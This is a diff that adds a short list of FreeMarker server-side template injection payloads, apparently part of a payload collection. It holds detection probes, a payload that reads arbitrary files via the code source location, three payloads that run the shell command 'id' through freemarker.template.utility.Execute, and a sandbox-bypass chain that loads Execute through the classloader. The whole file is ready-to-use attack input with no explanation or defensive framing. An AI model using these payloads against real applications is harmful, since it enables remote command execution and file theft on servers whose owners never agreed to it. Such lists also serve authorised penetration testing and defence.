@@ -1,0 +1,17 @@
+${7*7}
+#{7*7}
+
+//Read File
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
+
+//RCE
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+//Sandbox bypass
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
